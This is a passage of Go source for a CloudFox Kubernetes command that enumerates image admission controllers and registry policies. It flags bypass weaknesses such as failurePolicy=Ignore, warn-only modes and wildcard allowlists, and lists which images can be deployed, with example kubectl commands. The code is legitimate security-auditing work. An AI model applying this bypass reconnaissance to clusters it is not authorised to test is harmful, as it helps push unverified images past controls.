package commands

import (
	"context"
	"fmt"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

const K8S_IMAGE_ADMISSION_MODULE_NAME = "image_admission"

var ImageAdmissionCmd = &cobra.Command{
	Use:     "image-admission",
	Aliases: []string{"img-admit", "image-policy"},
	Short:   "Enumerate image admission controllers and registry policies",
	Long: `
Analyze image admission controllers and policies including:
  - Registry allowlists/denylists
  - Image signature verification (Cosign, Notary, Sigstore)
  - Binary authorization and attestations
  - Vulnerability scanning admission
  - Policy engine image rules (Kyverno, Gatekeeper, etc.)

Detected controllers:
  - Portieris (IBM) - Image signature verification
  - Connaisseur - Signature verification
  - Kritis (Google) - Binary authorization for GKE
  - Ratify (Microsoft) - Artifact verification
  - ImagePolicyWebhook - Built-in Kubernetes
  - Policy engine image rules

  cloudfox kubernetes image-admission`,
	Run: ListImageAdmission,
}

type ImageAdmissionOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t ImageAdmissionOutput) TableFiles() []internal.TableFile { return t.Table }
func (t ImageAdmissionOutput) LootFiles() []internal.LootFile   { return t.Loot }

// ImageAdmissionController represents a detected image admission controller
type ImageAdmissionController struct {
	Name           string
	Type           string // portieris, connaisseur, kritis, ratify, imagepolicywebhook, policy-engine
	Namespace      string
	WebhookName    string
	FailurePolicy  string
	Status         string // active, inactive, unknown
	PolicyCount    int
	TrustAnchors   []string
	AllowedRepos   []string
	BlockedRepos   []string
	SignatureReqs  bool
	VulnScanning   bool
	BypassRisk     string
	ImageVerified  bool // True if controller image was verified
}

// PortierisPolicy represents a Portieris ImagePolicy or ClusterImagePolicy
type PortierisPolicy struct {
	Name            string
	Namespace       string
	IsClusterPolicy bool
	Repositories    []PortierisRepo
	TrustEnabled    bool
}

// PortierisRepo represents a repository configuration in Portieris
type PortierisRepo struct {
	Name           string
	Policy         string // trust, reject, allow
	KeySecret      string
	SignerSecrets  []string
	MutateImage    bool
	VulnPolicy     string
}

// ConnaisseurPolicy represents a Connaisseur ImagePolicy
type ConnaisseurPolicy struct {
	Name       string
	Validators []string
	Pattern    string
	Rule       string // allow, reject, validate
}

// RatifyPolicy represents a Ratify verification policy
type RatifyPolicy struct {
	Name       string
	Namespace  string
	Verifiers  []string
	ArtifactTypes []string
}

// KritisPolicy represents a Kritis attestation policy
type KritisPolicy struct {
	Name               string
	Namespace          string
	AttestationAuth    string
	RequiredAttestors  []string
	DefaultAllow       bool
}

// SigstorePolicy represents a Sigstore Policy Controller ClusterImagePolicy
type SigstorePolicy struct {
	Name                string
	Images              []string
	Authorities         []string
	Mode                string // enforce, warn
	KeylessEnabled      bool
	KeyRefs             []string
	AttestationsEnabled bool     // True if attestations are required
	AttestationTypes    []string // Types of attestations required (slsa, in-toto, spdx, cyclonedx, etc.)
}

// GCPBinaryAuthPolicy represents GCP Binary Authorization status
type GCPBinaryAuthPolicy struct {
	Name              string
	Enabled           bool
	DefaultRule       string // allow, deny, require-attestation
	RequiredAttestors []string
	BreakGlassEnabled bool
}

// AWSECRScanPolicy represents AWS ECR image scanning configuration
type AWSECRScanPolicy struct {
	Name          string
	ScanOnPush    bool
	ScanFrequency string
	SeverityCount map[string]int
}

// AzureDefenderPolicy represents Azure Defender for Containers
type AzureDefenderPolicy struct {
	Name              string
	Enabled           bool
	ScanningEnabled   bool
	RuntimeProtection bool
}

// ImageSourceAnalysis holds comprehensive analysis of images deployed in the cluster
type ImageSourceAnalysis struct {
	TotalImages         int
	UniqueImages        int
	RegistryBreakdown   map[string]*RegistryUsage // registry -> usage details
	PublicRegistryCount int
	PrivateRegistryCount int
	LatestTagCount      int
	NoTagCount          int
	DigestPinnedCount   int
	ImagesWithoutDigest int
	VulnerablePatterns  []string
	ImagesByNamespace   map[string][]ImageInfo
}

// RegistryUsage tracks usage of a specific registry
type RegistryUsage struct {
	Registry       string
	ImageCount     int
	UniqueImages   []string
	IsPublic       bool
	IsAllowed      bool   // Based on policy analysis
	BlockingPolicy string // Which policy blocks/allows this
	Namespaces     []string
	LatestCount    int
	NoTagCount     int
	DigestCount    int
	RiskLevel      string
}

// ImageInfo represents a deployed container image
type ImageInfo struct {
	FullImage   string
	Registry    string
	Repository  string
	Tag         string
	Digest      string
	IsPublic    bool
	HasLatest   bool
	HasDigest   bool
	PodName     string
	Namespace   string
	Container   string
	IsInit      bool
}

// PolicyEffectivenessAnalysis analyzes how effective image policies are
type PolicyEffectivenessAnalysis struct {
	IsBlocking            bool
	BlockingLevel         string // "none", "partial", "full"
	BlockingReason        string
	CoveredRegistries     []string
	UncoveredRegistries   []string
	WildcardAllows        []string
	WeakPolicies          []string
	BypassVectors         []string
	PublicRegistryBlocked map[string]bool
	LatestTagBlocked      bool
	UnsignedAllowed       bool
	Recommendations       []string
}

// AquaSecurityPolicy represents Aqua Security admission policy
type AquaSecurityPolicy struct {
	Name              string
	Namespace         string
	Enabled           bool
	BlockUnregistered bool
	BlockMalware      bool
	BlockSensitiveData bool
	CVSSThreshold     float64
	AllowedRegistries []string
}

// PrismaCloudPolicy represents Prisma Cloud (Twistlock) policy
type PrismaCloudPolicy struct {
	Name              string
	Enabled           bool
	BlockThreshold    string // critical, high, medium, low
	GracePeriodDays   int
	BlockMalware      bool
	BlockCompliance   bool
	TrustedRegistries []string
}

// SysdigSecurePolicy represents Sysdig Secure admission policy
type SysdigSecurePolicy struct {
	Name              string
	Enabled           bool
	ScanningEnabled   bool
	BlockOnFailure    bool
	CVSSThreshold     float64
	AllowedRegistries []string
}

// NeuVectorPolicy represents NeuVector admission policy
type NeuVectorPolicy struct {
	Name             string
	Namespace        string
	Enabled          bool
	Mode             string // Protect, Monitor, Discover
	ScanningEnabled  bool
	BlockHighCVE     bool
	AllowedRegistries []string
	DeniedRegistries  []string
}

// StackRoxPolicy represents StackRox/Red Hat ACS policy
type StackRoxPolicy struct {
	Name              string
	Enabled           bool
	EnforcementAction string // SCALE_TO_ZERO, FAIL_DEPLOYMENT, KILL_POD
	Categories        []string
	Severity          string
	ImageCriteria     []string
}

// SnykContainerPolicy represents Snyk Container admission policy
type SnykContainerPolicy struct {
	Name              string
	Enabled           bool
	SeverityThreshold string
	AutoFix           bool
	BlockOnFailure    bool
	MonitoredProjects []string
}

// AnchorePolicy represents Anchore Enterprise admission policy
type AnchorePolicy struct {
	Name              string
	Enabled           bool
	PolicyBundleID    string
	FailOnPolicyEval  bool
	Mode              string // enforce, audit
	AllowedRegistries []string
}

// TrivyOperatorPolicy represents Trivy Operator configuration
type TrivyOperatorPolicy struct {
	Name                 string
	Namespace            string
	ScanJobsEnabled      bool
	VulnerabilityReports bool
	ConfigAuditReports   bool
	SBOMEnabled          bool
	SeverityThreshold    string
}

// KubewardenPolicy represents Kubewarden admission policy
type KubewardenPolicy struct {
	Name           string
	Namespace      string
	IsClusterWide  bool
	PolicyServer   string
	Module         string // wasm module URL
	Mode           string // protect, monitor
	Mutating       bool
	Rules          []string
}

// NotationPolicy represents Notation/Notary v2 verification policy
type NotationPolicy struct {
	Name              string
	Enabled           bool
	TrustPolicyName   string
	TrustStores       []string
	SignatureFormat   string
	VerificationLevel string
}

// HarborPolicy represents Harbor registry policy
type HarborPolicy struct {
	Name                 string
	Enabled              bool
	PreventVulnImages    bool
	SeverityThreshold    string
	AutoScan             bool
	ContentTrustEnabled  bool
	CosignEnabled        bool
}

// AWSSignerPolicy represents AWS Signer for container images
type AWSSignerPolicy struct {
	Name              string
	Enabled           bool
	SigningProfileARN string
	PlatformID        string
	AllowUnsigned     bool
}

// AzurePolicyConfig represents Azure Policy for AKS
type AzurePolicyConfig struct {
	Name                 string
	Enabled              bool
	AllowedRegistries    []string
	RequireDigest        bool
	BlockVulnerabilities bool
	ACROnly              bool
}

// ClairPolicy represents Clair vulnerability scanner policy
type ClairPolicy struct {
	Name              string
	Enabled           bool
	SeverityThreshold string
	FixableOnly       bool
	AllowList         []string
}

// WizPolicy represents Wiz container security policy
type WizPolicy struct {
	Name                string
	Enabled             bool
	ScanningEnabled     bool
	BlockVulnerabilities bool
	SeverityThreshold   string
	AllowedRegistries   []string
}

// LaceworkPolicy represents Lacework container security policy
type LaceworkPolicy struct {
	Name              string
	Enabled           bool
	ScanningEnabled   bool
	BlockOnFailure    bool
	SeverityThreshold string
	IntegrationID     string
}

// CosignStandalonePolicy represents standalone Cosign signature verification
type CosignStandalonePolicy struct {
	Name             string
	Enabled          bool
	KeyRefs          []string
	KeylessEnabled   bool
	VerifyAttestations bool
	TransparencyLog  bool
}

// FluxImagePolicy represents Flux Image Automation policy
type FluxImagePolicy struct {
	Name              string
	Namespace         string
	ImageRepository   string
	FilterTags        string
	Policy            string // semver, alphabetical, numerical
	Range             string
}

// JFrogXrayPolicy represents JFrog Xray security scanning policy
type JFrogXrayPolicy struct {
	Name              string
	Enabled           bool
	SeverityThreshold string
	BlockDownloads    bool
	WatchNames        []string
	PolicyRules       []string
}

// DeepfencePolicy represents Deepfence ThreatMapper policy
type DeepfencePolicy struct {
	Name              string
	Enabled           bool
	ScanningEnabled   bool
	SeverityThreshold string
	BlockMalware      bool
}

// QualysPolicy represents Qualys Container Security policy
type QualysPolicy struct {
	Name              string
	Enabled           bool
	ScanningEnabled   bool
	SeverityThreshold string
	BlockOnCritical   bool
}

// DockerScoutPolicy represents Docker Scout policy
type DockerScoutPolicy struct {
	Name              string
	Enabled           bool
	SBOMEnabled       bool
	PolicyCheck       bool
	SeverityThreshold string
}

// Common public registries to check
var publicRegistries = map[string]string{
	"docker.io":           "Docker Hub",
	"registry.hub.docker.com": "Docker Hub",
	"index.docker.io":     "Docker Hub",
	"gcr.io":              "Google Container Registry",
	"us.gcr.io":           "Google Container Registry (US)",
	"eu.gcr.io":           "Google Container Registry (EU)",
	"asia.gcr.io":         "Google Container Registry (Asia)",
	"us-docker.pkg.dev":   "Google Artifact Registry",
	"quay.io":             "Red Hat Quay",
	"ghcr.io":             "GitHub Container Registry",
	"mcr.microsoft.com":   "Microsoft Container Registry",
	"registry.k8s.io":     "Kubernetes Registry",
	"k8s.gcr.io":          "Kubernetes (legacy)",
	"public.ecr.aws":      "AWS Public ECR",
	"docker.elastic.co":   "Elastic",
	"nvcr.io":             "NVIDIA",
	"registry.gitlab.com": "GitLab Registry",
	"cgr.dev":             "Chainguard",
}

// verifyImageAdmissionImage checks if an image matches known patterns for the specified controller
// Now uses the shared admission SDK for centralized engine detection
func verifyImageAdmissionImage(image string, controller string) bool {
	return VerifyControllerImage(image, controller)
}

// ImagePolicyFinding represents a finding for image admission
type ImagePolicyFinding struct {
	Controller       string
	PolicyName       string
	Scope            string // cluster, namespace
	Namespace        string
	Repository       string
	Policy           string // allow, reject, verify
	SignatureReq     string
	Attestation      string
	VulnPolicy       string
	BypassRisk       string
}

// AllowedImageEntry represents an allowed image/registry entry from policies
// This is useful for penetration testers to identify what images can be deployed
type AllowedImageEntry struct {
	Controller        string   // Which admission controller allows this
	PolicyName        string   // Name of the policy
	Scope             string   // cluster or namespace
	Namespaces        []string // If namespace-scoped, which namespaces
	AllowedPattern    string   // Image pattern/registry allowed (e.g., "gcr.io/*", "docker.io/library/*")
	SignatureRequired bool     // Whether signatures are required
	AttestationReq    string   // What attestations are required (if any)
	Conditions        string   // Any conditions (e.g., "no :latest", "digest required")
	DeployCommand     string   // Example kubectl command to deploy
}

func ListImageAdmission(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithTimeout()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Analyzing image admission controllers for %s", globals.ClusterName), K8S_IMAGE_ADMISSION_MODULE_NAME)

	clientset := config.GetClientOrExit()
	dynClient := config.GetDynamicClientOrExit()

	// Detect image admission controllers
	var controllers []ImageAdmissionController

	// Check for Portieris
	portierisController, portierisPolicies := analyzePortieris(ctx, clientset, dynClient)
	if portierisController.Name != "" {
		controllers = append(controllers, portierisController)
	}

	// Check for Connaisseur
	connaisseurController, connaisseurPolicies := analyzeConnaisseur(ctx, clientset, dynClient)
	if connaisseurController.Name != "" {
		controllers = append(controllers, connaisseurController)
	}

	// Check for Ratify
	ratifyController, ratifyPolicies := analyzeRatify(ctx, clientset, dynClient)
	if ratifyController.Name != "" {
		controllers = append(controllers, ratifyController)
	}

	// Check for Kritis
	kritisController, kritisPolicies := analyzeKritis(ctx, clientset, dynClient)
	if kritisController.Name != "" {
		controllers = append(controllers, kritisController)
	}

	// Check for ImagePolicyWebhook (built-in)
	ipwController := analyzeImagePolicyWebhook(ctx, dynClient)
	if ipwController.Name != "" {
		controllers = append(controllers, ipwController)
	}

	// Check for Sigstore Policy Controller
	sigstoreController, sigstorePolicies := analyzeSigstorePolicyController(ctx, clientset, dynClient)
	if sigstoreController.Name != "" {
		controllers = append(controllers, sigstoreController)
	}

	// Check for GCP Binary Authorization
	gcpBinAuthController := analyzeGCPBinaryAuthorization(ctx, dynClient)
	if gcpBinAuthController.Name != "" {
		controllers = append(controllers, gcpBinAuthController)
	}

	// Check for Aqua Security
	aquaController, aquaPolicies := analyzeAquaSecurity(ctx, clientset, dynClient)
	if aquaController.Name != "" {
		controllers = append(controllers, aquaController)
	}

	// Check for Prisma Cloud (Twistlock)
	prismaController, prismaPolicies := analyzePrismaCloud(ctx, clientset, dynClient)
	if prismaController.Name != "" {
		controllers = append(controllers, prismaController)
	}

	// Check for Sysdig Secure
	sysdigController, sysdigPolicies := analyzeSysdigSecure(ctx, clientset, dynClient)
	if sysdigController.Name != "" {
		controllers = append(controllers, sysdigController)
	}

	// Check for NeuVector
	neuvectorController, neuvectorPolicies := analyzeNeuVector(ctx, clientset, dynClient)
	if neuvectorController.Name != "" {
		controllers = append(controllers, neuvectorController)
	}

	// Check for StackRox/Red Hat ACS
	stackroxController, stackroxPolicies := analyzeStackRox(ctx, clientset, dynClient)
	if stackroxController.Name != "" {
		controllers = append(controllers, stackroxController)
	}

	// Check for Snyk Container
	snykController, snykPolicies := analyzeSnykContainer(ctx, clientset, dynClient)
	if snykController.Name != "" {
		controllers = append(controllers, snykController)
	}

	// Check for Anchore Enterprise
	anchoreController, anchorePolicies := analyzeAnchore(ctx, clientset, dynClient)
	if anchoreController.Name != "" {
		controllers = append(controllers, anchoreController)
	}

	// Check for Trivy Operator
	trivyController, trivyPolicies := analyzeTrivyOperator(ctx, clientset, dynClient)
	if trivyController.Name != "" {
		controllers = append(controllers, trivyController)
	}

	// Check for Kubewarden
	kubewardenController, kubewardenPolicies := analyzeKubewarden(ctx, clientset, dynClient)
	if kubewardenController.Name != "" {
		controllers = append(controllers, kubewardenController)
	}

	// Check for Notation/Notary v2
	notationController, notationPolicies := analyzeNotation(ctx, clientset, dynClient)
	if notationController.Name != "" {
		controllers = append(controllers, notationController)
	}

	// Check for Harbor
	harborController, harborPolicies := analyzeHarbor(ctx, clientset, dynClient)
	if harborController.Name != "" {
		controllers = append(controllers, harborController)
	}

	// Check for Clair
	clairController, clairPolicies := analyzeClair(ctx, clientset, dynClient)
	if clairController.Name != "" {
		controllers = append(controllers, clairController)
	}

	// Check for Wiz
	wizController, wizPolicies := analyzeWiz(ctx, clientset, dynClient)
	if wizController.Name != "" {
		controllers = append(controllers, wizController)
	}

	// Check for Lacework
	laceworkController, laceworkPolicies := analyzeLacework(ctx, clientset, dynClient)
	if laceworkController.Name != "" {
		controllers = append(controllers, laceworkController)
	}

	// Check for standalone Cosign
	cosignController, cosignPolicies := analyzeCosignStandalone(ctx, clientset, dynClient)
	if cosignController.Name != "" {
		controllers = append(controllers, cosignController)
	}

	// Check for Flux Image Automation
	fluxImageController, fluxImagePolicies := analyzeFluxImageAutomation(ctx, clientset, dynClient)
	if fluxImageController.Name != "" {
		controllers = append(controllers, fluxImageController)
	}

	// Check for JFrog Xray
	xrayController, xrayPolicies := analyzeJFrogXray(ctx, clientset, dynClient)
	if xrayController.Name != "" {
		controllers = append(controllers, xrayController)
	}

	// Check for Deepfence ThreatMapper
	deepfenceController, deepfencePolicies := analyzeDeepfence(ctx, clientset, dynClient)
	if deepfenceController.Name != "" {
		controllers = append(controllers, deepfenceController)
	}

	// Check for Qualys Container Security
	qualysController, qualysPolicies := analyzeQualys(ctx, clientset, dynClient)
	if qualysController.Name != "" {
		controllers = append(controllers, qualysController)
	}

	// Check for Docker Scout
	dockerScoutController, dockerScoutPolicies := analyzeDockerScout(ctx, clientset, dynClient)
	if dockerScoutController.Name != "" {
		controllers = append(controllers, dockerScoutController)
	}

	// Check for policy engine image rules (Kyverno, Gatekeeper)
	policyEngineFindings := analyzeImagePolicyEngines(ctx, dynClient)

	// Note: All policy variables are now used in extractAllowedImages function

	// Get target namespaces for image source analysis
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, K8S_IMAGE_ADMISSION_MODULE_NAME)

	// Check for AWS Signer (needs namespaces)
	awsSignerController, awsSignerPolicies := analyzeAWSSigner(ctx, clientset, dynClient, namespaces)
	if awsSignerController.Name != "" {
		controllers = append(controllers, awsSignerController)
	}

	// Check for Azure Policy for AKS
	azurePolicyController, azurePolicyConfigs := analyzeAzurePolicy(ctx, clientset, dynClient)
	if azurePolicyController.Name != "" {
		controllers = append(controllers, azurePolicyController)
	}

	// Analyze deployed images
	imageSourceAnalysis := analyzeImageSources(ctx, clientset, namespaces)

	// Build findings
	var findings []ImagePolicyFinding

	// Add Portieris findings
	for _, policy := range portierisPolicies {
		for _, repo := range policy.Repositories {
			scope := "Namespace"
			if policy.IsClusterPolicy {
				scope = "Cluster"
			}
			signatureReq := "No"
			if repo.Policy == "trust" {
				signatureReq = "Yes"
			}
			findings = append(findings, ImagePolicyFinding{
				Controller:   "Portieris",
				PolicyName:   policy.Name,
				Scope:        scope,
				Namespace:    policy.Namespace,
				Repository:   repo.Name,
				Policy:       repo.Policy,
				SignatureReq: signatureReq,
				VulnPolicy:   repo.VulnPolicy,
			})
		}
	}

	// Add Connaisseur findings
	for _, policy := range connaisseurPolicies {
		signatureReq := "No"
		if policy.Rule == "validate" {
			signatureReq = "Yes"
		}
		findings = append(findings, ImagePolicyFinding{
			Controller:   "Connaisseur",
			PolicyName:   policy.Name,
			Scope:        "Cluster",
			Repository:   policy.Pattern,
			Policy:       policy.Rule,
			SignatureReq: signatureReq,
		})
	}

	// Add Ratify findings
	for _, policy := range ratifyPolicies {
		scope := "Cluster"
		if policy.Namespace != "" {
			scope = "Namespace"
		}
		findings = append(findings, ImagePolicyFinding{
			Controller:   "Ratify",
			PolicyName:   policy.Name,
			Scope:        scope,
			Namespace:    policy.Namespace,
			SignatureReq: "Yes",
			Attestation:  strings.Join(policy.ArtifactTypes, ", "),
		})
	}

	// Add Kritis findings
	for _, policy := range kritisPolicies {
		bypassRisk := ""
		if policy.DefaultAllow {
			bypassRisk = "Default Allow"
		}
		findings = append(findings, ImagePolicyFinding{
			Controller:   "Kritis",
			PolicyName:   policy.Name,
			Scope:        "Namespace",
			Namespace:    policy.Namespace,
			SignatureReq: "Yes",
			Attestation:  strings.Join(policy.RequiredAttestors, ", "),
			BypassRisk:   bypassRisk,
		})
	}

	// Add Sigstore findings
	for _, policy := range sigstorePolicies {
		mode := policy.Mode
		if mode == "" {
			mode = "enforce"
		}
		bypassRisk := ""
		if mode == "warn" {
			bypassRisk = "Warn only"
		}
		for _, image := range policy.Images {
			findings = append(findings, ImagePolicyFinding{
				Controller:   "Sigstore",
				PolicyName:   policy.Name,
				Scope:        "Cluster",
				Repository:   image,
				Policy:       mode,
				SignatureReq: "Yes",
				Attestation:  strings.Join(policy.Authorities, ", "),
				BypassRisk:   bypassRisk,
			})
		}
	}

	// Add policy engine findings
	findings = append(findings, policyEngineFindings...)

	// Analyze policy effectiveness
	policyEffectiveness := analyzePolicyEffectiveness(controllers, findings, &imageSourceAnalysis)

	// Extract allowed images from all policies
	allowedImages := extractAllowedImages(
		controllers,
		portierisPolicies,
		connaisseurPolicies,
		sigstorePolicies,
		kritisPolicies,
		aquaPolicies,
		prismaPolicies,
		sysdigPolicies,
		neuvectorPolicies,
		anchorePolicies,
		azurePolicyConfigs,
		clairPolicies,
		ratifyPolicies,
		stackroxPolicies,
		snykPolicies,
		trivyPolicies,
		kubewardenPolicies,
		notationPolicies,
		harborPolicies,
		awsSignerPolicies,
		wizPolicies,
		laceworkPolicies,
		cosignPolicies,
		fluxImagePolicies,
		xrayPolicies,
		deepfencePolicies,
		qualysPolicies,
		dockerScoutPolicies,
		policyEngineFindings,
	)

	// Generate tables
	controllerHeaders := []string{
		"Controller",
		"Type",
		"Namespace",
		"Webhook",
		"Failure Policy",
		"Status",
		"Policies",
		"Signature Required",
		"Bypass Risk",
	}

	findingHeaders := []string{
		"Controller",
		"Policy",
		"Scope",
		"Namespace",
		"Repository/Pattern",
		"Action",
		"Signature",
		"Attestation",
		"Vuln Policy",
		"Bypass Risk",
	}

	registryHeaders := []string{
		"Risk",
		"Registry",
		"Type",
		"Image Count",
		"Unique Images",
		"Namespaces",
		":latest Count",
		"Digest Pinned",
		"Policy Coverage",
		"Blocking Policy",
	}

	summaryHeaders := []string{
		"Metric",
		"Value",
		"Risk Assessment",
	}

	allowedImagesHeaders := []string{
		"Controller",
		"Policy",
		"Scope",
		"Namespaces",
		"Allowed Pattern",
		"Signature Req",
		"Conditions",
		"Deploy Command",
	}

	var controllerRows [][]string
	var findingRows [][]string
	var registryRows [][]string
	var summaryRows [][]string
	var allowedImagesRows [][]string

	for _, c := range controllers {
		sigReq := "No"
		if c.SignatureReqs {
			sigReq = "Yes"
		}
		bypassRisk := c.BypassRisk
		if bypassRisk == "" {
			bypassRisk = "<NONE>"
		}
		if c.FailurePolicy == "Ignore" {
			bypassRisk = "Webhook Ignore"
		}

		controllerRows = append(controllerRows, []string{
			c.Name,
			c.Type,
			c.Namespace,
			c.WebhookName,
			c.FailurePolicy,
			c.Status,
			fmt.Sprintf("%d", c.PolicyCount),
			sigReq,
			bypassRisk,
		})
	}

	for _, f := range findings {
		ns := f.Namespace
		if ns == "" {
			ns = "<NONE>"
		}
		repo := f.Repository
		if repo == "" {
			repo = "*"
		}
		attestation := f.Attestation
		if attestation == "" {
			attestation = "<NONE>"
		}
		vulnPolicy := f.VulnPolicy
		if vulnPolicy == "" {
			vulnPolicy = "<NONE>"
		}
		bypassRisk := f.BypassRisk
		if bypassRisk == "" {
			bypassRisk = "<NONE>"
		}

		findingRows = append(findingRows, []string{
			f.Controller,
			f.PolicyName,
			f.Scope,
			ns,
			repo,
			f.Policy,
			f.SignatureReq,
			attestation,
			vulnPolicy,
			bypassRisk,
		})
	}

	// Build registry breakdown rows
	for _, usage := range imageSourceAnalysis.RegistryBreakdown {
		regType := "Private"
		if usage.IsPublic {
			regType = "Public"
		}

		// Determine risk level
		risk := shared.RiskLow
		if usage.IsPublic && !policyEffectiveness.PublicRegistryBlocked[usage.Registry] {
			risk = shared.RiskHigh
		}
		if usage.LatestCount > 0 {
			if risk == shared.RiskLow {
				risk = shared.RiskMedium
			}
		}
		if usage.BlockingPolicy == "" && len(controllers) > 0 {
			risk = shared.RiskMedium
		}
		if len(controllers) == 0 {
			risk = shared.RiskCritical
		}

		coverage := "Not Covered"
		if usage.BlockingPolicy != "" {
			coverage = "Covered"
		}

		blockingPolicy := usage.BlockingPolicy
		if blockingPolicy == "" {
			blockingPolicy = "<NONE>"
		}

		registryRows = append(registryRows, []string{
			risk,
			usage.Registry,
			regType,
			fmt.Sprintf("%d", usage.ImageCount),
			fmt.Sprintf("%d", len(usage.UniqueImages)),
			fmt.Sprintf("%d", len(usage.Namespaces)),
			fmt.Sprintf("%d", usage.LatestCount),
			fmt.Sprintf("%d", usage.DigestCount),
			coverage,
			blockingPolicy,
		})
	}

	// Build summary rows
	admissionStatus := "CRITICAL: No controllers"
	admissionRisk := shared.RiskCritical
	if len(controllers) > 0 {
		if policyEffectiveness.IsBlocking {
			admissionStatus = "Enforcing"
			admissionRisk = shared.RiskLow
		} else {
			admissionStatus = policyEffectiveness.BlockingLevel
			admissionRisk = shared.RiskMedium
			if policyEffectiveness.BlockingLevel == "weak" || policyEffectiveness.BlockingLevel == "none" {
				admissionRisk = shared.RiskHigh
			}
		}
	}

	summaryRows = append(summaryRows, []string{
		"Image Admission Status",
		admissionStatus,
		admissionRisk,
	})
	summaryRows = append(summaryRows, []string{
		"Controllers Detected",
		fmt.Sprintf("%d", len(controllers)),
		func() string {
			if len(controllers) == 0 {
				return shared.RiskCritical
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Total Images Deployed",
		fmt.Sprintf("%d", imageSourceAnalysis.TotalImages),
		shared.RiskLow,
	})
	summaryRows = append(summaryRows, []string{
		"Unique Registries",
		fmt.Sprintf("%d (%d public, %d private)",
			len(imageSourceAnalysis.RegistryBreakdown),
			imageSourceAnalysis.PublicRegistryCount,
			imageSourceAnalysis.PrivateRegistryCount),
		func() string {
			if imageSourceAnalysis.PublicRegistryCount > 0 && len(controllers) == 0 {
				return shared.RiskHigh
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Images Using :latest",
		fmt.Sprintf("%d", imageSourceAnalysis.LatestTagCount),
		func() string {
			if imageSourceAnalysis.LatestTagCount > 0 {
				return shared.RiskMedium
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Images Without Digest",
		fmt.Sprintf("%d", imageSourceAnalysis.ImagesWithoutDigest),
		func() string {
			if imageSourceAnalysis.ImagesWithoutDigest > imageSourceAnalysis.TotalImages/2 {
				return shared.RiskMedium
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Uncovered Registries",
		fmt.Sprintf("%d", len(policyEffectiveness.UncoveredRegistries)),
		func() string {
			if len(policyEffectiveness.UncoveredRegistries) > 0 {
				return shared.RiskHigh
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Weak Policies",
		fmt.Sprintf("%d", len(policyEffectiveness.WeakPolicies)),
		func() string {
			if len(policyEffectiveness.WeakPolicies) > 0 {
				return shared.RiskMedium
			}
			return shared.RiskLow
		}(),
	})
	summaryRows = append(summaryRows, []string{
		"Bypass Vectors",
		fmt.Sprintf("%d", len(policyEffectiveness.BypassVectors)),
		func() string {
			if len(policyEffectiveness.BypassVectors) > 0 {
				return shared.RiskHigh
			}
			return shared.RiskLow
		}(),
	})

	// Build allowed images rows
	for _, entry := range allowedImages {
		sigReq := "No"
		if entry.SignatureRequired {
			sigReq = "Yes"
		}

		namespaces := "<ALL>"
		if len(entry.Namespaces) > 0 {
			namespaces = strings.Join(entry.Namespaces, ", ")
		}

		conditions := entry.Conditions
		if conditions == "" {
			conditions = "<NONE>"
		}

		deployCmd := entry.DeployCommand
		if deployCmd == "" {
			deployCmd = "kubectl run test --image=<image>"
		}

		allowedImagesRows = append(allowedImagesRows, []string{
			entry.Controller,
			entry.PolicyName,
			entry.Scope,
			namespaces,
			entry.AllowedPattern,
			sigReq,
			conditions,
			deployCmd,
		})
	}

	// Build loot
	loot := shared.NewLootBuilder()

	loot.Section("Overview").SetHeader(`#####################################
##### Image Admission Controllers
#####################################
#
# Image admission controllers verify container images before deployment
# They can enforce:
# - Registry allowlists/denylists
# - Image signatures (Cosign, Notary, Sigstore)
# - Binary authorization (attestations)
# - Vulnerability scanning thresholds
#
# Bypass vectors:
# - No image admission = deploy any image from any registry
# - failurePolicy=Ignore = webhook failures don't block
# - Wildcard patterns = overly permissive
# - Unsigned image exceptions
#`)

	loot.Section("Portieris").SetHeader(`#####################################
##### Portieris (IBM)
#####################################
#
# Image signature verification using Notary
# Uses ImagePolicy and ClusterImagePolicy CRDs
#
# Policies: trust, reject, allow
# - trust: Require valid signature
# - reject: Block image
# - allow: No signature required
#`)

	loot.Section("Connaisseur").SetHeader(`#####################################
##### Connaisseur
#####################################
#
# Lightweight image signature verification
# Supports Cosign, Notary, and static signatures
#
# Configuration is in ConfigMap, not CRDs
#`)

	loot.Section("Ratify").SetHeader(`#####################################
##### Ratify (Microsoft)
#####################################
#
# Artifact verification framework
# Supports signatures, SBOM, vulnerability reports
#
# Uses Verifier and Store CRDs
#`)

	loot.Section("Kritis").SetHeader(`#####################################
##### Kritis (Google)
#####################################
#
# Binary Authorization for GKE
# Requires attestations from trusted attestors
#
# Uses AttestationAuthority and ImageSecurityPolicy CRDs
#`)

	loot.Section("Sigstore").SetHeader(`#####################################
##### Sigstore Policy Controller
#####################################
#
# Cosign signature verification using Sigstore
# Uses ClusterImagePolicy CRDs
#
# Features:
# - Cosign signature verification
# - Keyless signing (Fulcio + Rekor)
# - Custom key verification
# - Attestation verification
#`)

	loot.Section("GCPBinAuth").SetHeader(`#####################################
##### GCP Binary Authorization
#####################################
#
# GKE-native image verification
# Requires attestations from trusted attestors
#
# Configured at GCP project/cluster level
# Can enforce deploy-time verification
#`)

	loot.Section("PolicyEngines").SetHeader(`#####################################
##### Policy Engine Image Rules
#####################################
#
# Kyverno, Gatekeeper, and other policy engines
# can enforce image-related rules:
# - Registry allowlists
# - Image tag requirements (no :latest)
